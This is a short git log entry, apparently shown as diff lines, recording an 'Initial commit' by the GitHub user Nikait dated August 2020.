+commit 9a20130f4c7977728e018c6238710eadb79313da
+Author: Nikait <50284221+Nikait@users.noreply.github.com>
+Date:   Tue Aug 25 23:32:15 2020 +0300
+
+    Initial commit
